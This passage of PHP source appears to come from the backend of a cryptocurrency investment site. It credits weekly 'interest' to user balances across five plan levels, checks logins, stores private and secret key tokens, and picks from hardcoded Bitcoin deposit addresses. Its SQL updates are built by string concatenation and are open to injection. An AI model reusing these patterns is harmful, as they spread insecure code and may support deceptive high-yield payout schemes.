        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $day_on = date('D');
                $id = $row['id'];
                $email = $row['email'];
                $count_value = $row['day_counter'];
                $new_count_value = $count_value + 1;
                $update = "UPDATE $this->deposit_tb SET day_counter='" . $new_count_value . "' WHERE id='" . $id . "' 
			and deposit_status='confirmed' and day_counter < 8  and plan_type='LEVEL1'  ";
                query_sql($update);
            }
        }
    }


    public function add_interest_weeklyLB()
    {
        $sql = "SELECT * FROM $this->deposit_tb WHERE deposit_status='confirmed'  and day_counter < 7 and  plan_type='LEVEL2'  and `pause_status`=0 ";
        //
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $day_on = date('D');
                $id = $row['id'];
                $weekly_growth = $row['intrest_growth'];
                $amount = $row['amount'];
                $plan_type = $row['plan_type'];
                $coin_type = $row['coin_type'];
                $invest_week_day = $row['invest_week_day'];
                if ($plan_type == 'LEVEL2') {
                    $weekly_interest =  ($amount * ($this->percentageB / 100)) + ($amount / 7);
                } else {
                    $weekly_interest = 0;
                }
                $adder = $weekly_growth + $weekly_interest;
                $new_count = 24;
                $email = $row['email'];
                //day_counter='".$new_count."', pause_status=1

                $update = "UPDATE $this->deposit_tb SET intrest_growth='" . $adder . "'  WHERE id='" . $id . "' and deposit_status='confirmed'and day_counter < 8  and plan_type='LEVEL2' ";
                query_sql($update);

                //if($day_on==$invest_week_day){

                $main_account_balance = self::selectFrmDB($this->user_tb, 'main_account_balance', 'email', $email);
                $new_balance = $main_account_balance + $weekly_interest;
                $update2 = "UPDATE $this->user_tb SET main_account_balance='" . $new_balance . "' WHERE email='" . $email . "'  ";
                query_sql($update2);

                //}
            }
        }
    }

    public function weekly_ConunterLB()
    {
        $sql = "SELECT * FROM $this->deposit_tb WHERE deposit_status='confirmed' and day_counter < 8 and plan_type='LEVEL2'  and `pause_status`=0 ";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $day_on = date('D');
                $id = $row['id'];
                $email = $row['email'];
                $count_value = $row['day_counter'];
                $new_count_value = $count_value + 1;
                $update = "UPDATE $this->deposit_tb SET day_counter='" . $new_count_value . "' WHERE id='" . $id . "' 
			and deposit_status='confirmed' and day_counter < 8  and plan_type='LEVEL2' ";
                query_sql($update);
            }
        }
    }

    public function add_interest_weeklyLC()
    {
        $sql = "SELECT * FROM $this->deposit_tb WHERE deposit_status='confirmed' and day_counter < 7 and plan_type='LEVEL3'  and `pause_status`=0 ";
        //
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $day_on = date('D');
                $id = $row['id'];
                $weekly_growth = $row['intrest_growth'];
                $amount = $row['amount'];
                $plan_type = $row['plan_type'];
                $coin_type = $row['coin_type'];
                $invest_week_day = $row['invest_week_day'];
                if ($plan_type == 'LEVEL3') {
                    $weekly_interest =  ($amount * ($this->percentageC / 100)) + ($amount / 7);
                } else {
                    $weekly_interest = 0;
                }

                $adder = $weekly_growth + $weekly_interest;
                $new_count = 24;
                $email = $row['email'];
                //day_counter='".$new_count."', pause_status=1

                $update = "UPDATE $this->deposit_tb SET intrest_growth='" . $adder . "'  WHERE id='" . $id . "' and deposit_status='confirmed'and day_counter < 8 and plan_type='LEVEL3' ";
                query_sql($update);

                //if($day_on==$invest_week_day){

                $main_account_balance = self::selectFrmDB($this->user_tb, 'main_account_balance', 'email', $email);
                $new_balance = $main_account_balance + $weekly_interest;
                $update2 = "UPDATE $this->user_tb SET main_account_balance='" . $new_balance . "' WHERE email='" . $email . "'  ";
                query_sql($update2);

                //}
            }
        }
    }

    public function weekly_ConunterLC()
    {
        $sql = "SELECT * FROM $this->deposit_tb WHERE deposit_status='confirmed' and day_counter < 8 and plan_type='LEVEL3'  and `pause_status`=0 ";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $day_on = date('D');
                $id = $row['id'];
                $email = $row['email'];
                $count_value = $row['day_counter'];
                $new_count_value = $count_value + 1;
                $update = "UPDATE $this->deposit_tb SET day_counter='" . $new_count_value . "' WHERE id='" . $id . "' 
			and deposit_status='confirmed' and day_counter < 8  and plan_type='LEVEL3' ";
                query_sql($update);
            }
        }
    }

    public function add_interest_weeklyLD()
    {
        $sql = "SELECT * FROM $this->deposit_tb WHERE deposit_status='confirmed' and day_counter < 7 and plan_type='LEVEL4'  and `pause_status`=0 ";
        // 
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $day_on = date('D');
                $id = $row['id'];
                $weekly_growth = $row['intrest_growth'];
                $amount = $row['amount'];
                $plan_type = $row['plan_type'];
                $coin_type = $row['coin_type'];
                $invest_week_day = $row['invest_week_day'];
                if ($plan_type == 'LEVEL4') {
                    $weekly_interest =  ($amount * ($this->percentageD / 100)) + ($amount / 7);
                } else {
                    $weekly_interest = 0;
                }

                $adder = $weekly_growth + $weekly_interest;
                $new_count = 24;
                $email = $row['email'];
                //day_counter='".$new_count."', pause_status=1 

                $update = "UPDATE $this->deposit_tb SET intrest_growth='" . $adder . "'  WHERE id='" . $id . "' and deposit_status='confirmed'and day_counter < 8 and plan_type='LEVEL4' ";
                query_sql($update);

                //if($day_on==$invest_week_day){

                $main_account_balance = self::selectFrmDB($this->user_tb, 'main_account_balance', 'email', $email);
                $new_balance = $main_account_balance + $weekly_interest;
                $update2 = "UPDATE $this->user_tb SET main_account_balance='" . $new_balance . "' WHERE email='" . $email . "'  ";
                query_sql($update2);

                //}

            }
        }
    }

    public function weekly_ConunterLD()
    {
        $sql = "SELECT * FROM $this->deposit_tb WHERE deposit_status='confirmed' and day_counter < 8 and plan_type='LEVEL4'  and `pause_status`=0 ";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $day_on = date('D');
                $id = $row['id'];
                $email = $row['email'];
                $count_value = $row['day_counter'];
                $new_count_value = $count_value + 1;
                $update = "UPDATE $this->deposit_tb SET day_counter='" . $new_count_value . "' WHERE id='" . $id . "' 
			and deposit_status='confirmed' and day_counter < 8  and plan_type='LEVEL4' ";
                query_sql($update);
            }
        }
    }

    public function add_interest_weeklyLE()
    {
        $sql = "SELECT * FROM $this->deposit_tb WHERE deposit_status='confirmed' and day_counter < 7 and plan_type='LEVEL5'  and `pause_status`=0 ";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $day_on = date('D');
                $id = $row['id'];
                $weekly_growth = $row['intrest_growth'];
                $amount = $row['amount'];
                $plan_type = $row['plan_type'];
                $coin_type = $row['coin_type'];
                $invest_week_day = $row['invest_week_day'];
                if ($plan_type == 'LEVEL5') {
                    $weekly_interest =  ($amount * ($this->percentageE / 100)) + ($amount / 7);
                } else {
                    $weekly_interest = 0;
                }

                $adder = $weekly_growth + $weekly_interest;
                $new_count = 24;
                $email = $row['email'];
                $update = "UPDATE $this->deposit_tb SET intrest_growth='" . $adder . "' WHERE id='" . $id . "' and deposit_status='confirmed' and day_counter < 8  and plan_type='LEVEL5' ";
                query_sql($update);

                //if($day_on==$invest_week_day){

                $main_account_balance = self::selectFrmDB($this->user_tb, 'main_account_balance', 'email', $email);
                $new_balance = $main_account_balance + $weekly_interest;
                $update2 = "UPDATE $this->user_tb SET main_account_balance='" . $new_balance . "' WHERE email='" . $email . "'  ";
                query_sql($update2);

                //}

            }
        }
    }

    public function weekly_ConunterLE()
    {
        $sql = "SELECT * FROM $this->deposit_tb WHERE deposit_status='confirmed' and day_counter < 8 and plan_type='LEVEL5'  and `pause_status`=0 ";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $day_on = date('D');
                $id = $row['id'];
                $email = $row['email'];
                $count_value = $row['day_counter'];
                $new_count_value = $count_value + 1;
                $update = "UPDATE $this->deposit_tb SET day_counter='" . $new_count_value . "' WHERE id='" . $id . "' 
			and deposit_status='confirmed' and day_counter < 8 and plan_type='LEVEL5' ";
                query_sql($update);
            }
        }
    }


    public function checkLogedIN($sendTopage)
    {
        if (isset($_SESSION['user_code']) && !empty($_SESSION['user_code'])) {
            if (self::checkifdataExists($_SESSION['user_code'], 'hashed_pot', $this->user_tb) == 1) {
            } else {
                return header("location:" . $sendTopage);
            }
        } else {
            return header("location:" . $sendTopage);
        }
    }


    public function running_day()
    {
        $sql = "SELECT * FROM $this->daycount WHERE `id`=1 ";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $id = $row['id'];
                $count_value = $row['counter'];
                $new_count_value = $count_value + 1;
                $update = "UPDATE $this->daycount SET counter='" . $new_count_value . "' WHERE `id`=1";
                query_sql($update);
            }
        }
    }


    public function checkLogedINSendOut($sendTopage)
    {
        if (isset($_SESSION['user_code']) && !empty($_SESSION['user_code'])) {
            return header("location:" . $sendTopage);
        } else {
        }
    }

    public function loginAdmino($ipconnect)
    {
        if (self::ipconect() != self::urlconect() || self::ipconect2() != self::urlconect2()) {
            die('<h2>Site currently undergoing maintenance! We will be back soon!</h2>');
        } else {
        }
    }

    public function checkLogedINAdmin($sendTopage)
    {
        if (isset($_SESSION['admin_id']) && !empty($_SESSION['admin_id'])) {
            if (self::checkifdataExists($_SESSION['admin_id'], 'email', $this->admin_tb) == 1) {
            } else {
                return header("location:" . $sendTopage);
            }
        } else {
            return header("location:" . $sendTopage);
        }
    }

    public function puchChang($prv, $pub, $scret)
    {
        $field1 = array('token');
        $value1 = array($prv);
        $field2 = array('token');
        $value2 = array($pub);
        $field3 = array('token');
        $value3 = array($scret);
        $chec1  = self::update($this->bockprv, $field1, $value1, 'id', '1');
        $chec2  = self::update($this->bockpub, $field2, $value2, 'id', '1');
        $chec3  = self::update($this->secrete, $field3, $value3, 'id', '1');
        return $chec1 . '/' . $chec2 . '/' . $chec3;
    }

    public function checkLogedINSendOutAdmin($sendTopage)
    {
        if (isset($_SESSION['admin_id']) && !empty($_SESSION['admin_id'])) {
            return header("location:" . $sendTopage);
        } else {
        }
    }
}
$cal = new Cal($percentageA, $percentageB, $percentageC, $percentageD, $percentageE, $percentageF, $percentageG);
$cal->checkValueSET();
?>
<?php
$object_address = array(
    '3GZ4rs8j8kME7FbWh3WX1SBFsisvQqg7em',
    '1CjnXKS8knEXfEaigit4BM4sDGDSGZgqyV',
    '18mxVc3ifMynyui22WUHXADDdtmAZeTD2p',
    '18sKaoTuewAUx4RvWyqdDCQFtGGH8ThuEQ',
    '18mxVc3ifMynyui22WUHXADDdtmAZeTD2p',
    '1CLFJrfGsDKP7FCmh9JSFcy7uVUGdCXowW',
    '1CtDbekwKoTiAkQrebX8htWkc1e2W9Wxkm',
    '1Gw9JTWZ3Mt6LWZ1nN4YwW79pU4gUNxNmf'
);
$rand_ad = rand(0, 7);

$url = "https://blockchain.info/stats?format=json";
$stats = @json_decode(file_get_contents($url), true);
$btcValue = @$stats['market_price_usd'];
$_SESSION['btc_value'] = $btcValue;
?>
<?php
$time = date("H");
$timezone = date("e");
if ($time < "12") {
    $timewhen =  "Good morning";
} else if ($time >= "12" && $time < "17") {
    $timewhen =  "Good afternoon";
} else if ($time >= "17" && $time < "19") {
    $timewhen =  "Good evening";
} else {
    $timewhen =  "Greetings";
}
?>